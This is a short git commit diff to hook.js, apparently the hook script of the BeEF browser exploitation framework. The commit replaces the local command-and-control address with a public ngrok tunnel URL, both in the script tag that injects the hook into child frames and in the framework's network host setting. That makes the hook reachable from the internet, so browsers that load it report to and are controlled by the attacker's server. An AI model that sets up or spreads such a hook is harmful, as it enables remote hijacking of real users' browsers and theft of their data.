c81a37f04c4b50d949c5385007683c67f6f52432
Debarun Biswas <rw.68.work@gmail.com>
2026-02-15 01:54:13 +0530

    Update hook.js

--- hook.js
+++ hook.js
@@ -8979,7 +8979,7 @@ beef.browser = {
         // create script object
         var script = document.createElement('script');
         script.type = 'text/javascript';
-        script.src = 'http://127.0.0.1:3000/hook.js';
+        script.src = 'https://689a-103-170-182-46.ngrok-free.app/hook.js';
 
         // loop through child frames
         for (var i = 0; i < self.frames.length; i++) {
@@ -11733,7 +11733,7 @@ beef.regCmp('beef.logger');
  */
 beef.net = {
 
-    host: "127.0.0.1",
+    host: "https://689a-103-170-182-46.ngrok-free.app/",
     port: "3000",
     hook: "/hook.js",
     httpproto: "http",
